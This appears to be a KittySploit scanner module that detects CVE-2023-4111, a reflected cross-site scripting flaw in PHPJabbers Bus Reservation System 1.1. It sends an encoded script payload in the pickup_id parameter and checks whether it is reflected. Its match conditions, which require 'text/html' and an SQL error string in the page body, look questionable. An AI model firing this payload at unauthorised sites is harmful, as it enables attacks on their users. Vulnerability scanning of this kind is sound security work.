#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in PHP Jabbers Bus Reservation System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Bus Reservation System 1.1 - Cross-Site Scripting Detection',
        'description': 'A vulnerability was found in PHP Jabbers Bus Reservation System 1.1 and classified as problematic. Affected by this issue is some unknown functionality of the file /index.php. The manipulation of the argument index/pickup_id leads to cross site scripting. The attack may be launched remotely.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'xss', 'phpjabber', 'jabber', 'phpjabbers', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://vuldb.com/?id.235958',
            'https://packetstormsecurity.com/files/173927/PHPJabbers-Bus-Reservation-System-1.1-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4111',
            'https://vuldb.com/?ctiid.235958',
        ],
        'cve': 'CVE-2023-4111',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?controller=pjFrontEnd&action=pjActionGetLocations&locale=1&hide=0&index=4005&pickup_id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cid=1&view=1&month=7&year=2023&start_dt=&end_dt=&locale=&index=0&session_id=', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('You have an error in your SQL syntax', '><script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="PHPJabbers Bus Reservation System 1.1 - Cross-Site Scripting detected",
                path='/index.php?controller=pjFrontEnd&action=pjActionGetLocations&locale=1&hide=0&index=4005&pickup_id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cid=1&view=1&month=7&year=2023&start_dt=&end_dt=&locale=&index=0&session_id=',
            )
            return True
        return False

